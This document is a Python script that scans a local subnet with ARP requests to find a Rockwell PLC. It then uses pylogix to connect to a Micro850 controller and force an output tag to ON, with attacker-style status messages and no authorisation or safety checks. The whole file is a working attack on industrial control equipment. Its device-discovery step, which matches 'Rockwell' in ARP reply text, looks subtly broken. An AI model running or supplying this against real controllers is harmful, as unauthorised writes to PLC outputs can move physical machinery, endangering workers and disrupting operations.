from pylogix import PLC
from scapy.all import ARP, Ether, srp
import time

def find_plc_ip(network_prefix="192.168.1."):
    """
    Scans the local network to find the PLC's IP address by sending ARP requests.
    """
    print("[+] Scanning for Rockwell PLC on the network...")
    
    for i in range(1, 255):  # Scan from 192.168.1.1 to 192.168.1.254
        ip = f"{network_prefix}{i}"
        arp_request = ARP(pdst=ip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp_request
        result = srp(packet, timeout=0.5, verbose=False)[0]
        
        for sent, received in result:
            if "Rockwell" in received.summary():
                print(f"[+] PLC Found at IP: {received.psrc}")
                return received.psrc  # Return PLC IP Address

    print("[-] No PLC found on the network.")
    return None

def override_output(plc_ip, tag_name="OutputTag", new_value=1):
    """
    Connects to the Rockwell Micro850 PLC and overrides an output.
    """
    if not plc_ip:
        print("[-] No PLC IP detected. Cannot proceed.")
        return

    print(f"[+] Connecting to PLC at {plc_ip}...")
    
    plc = PLC()
    plc.IPAddress = plc_ip

    try:
        # Read the original value before overriding
        response = plc.Read(tag_name)
        if response.Status == "Success":
            print(f"[+] Original value of '{tag_name}': {response.Value}")
        else:
            print("[-] Failed to read tag value.")

        # Override the output
        print(f"[+] Forcing '{tag_name}' to {new_value}...")
        response = plc.Write(tag_name, new_value)

        if response.Status == "Success":
            print(f"[+] Successfully overridden '{tag_name}' to {new_value}")
        else:
            print("[-] Failed to override output.")

    except Exception as e:
        print(f"[-] Error: {e}")
    
    finally:
        plc.Close()

# ----------- MAIN EXECUTION -----------
plc_ip = find_plc_ip()
override_output(plc_ip, tag_name="Output1", new_value=1)  # Force Output1 to ON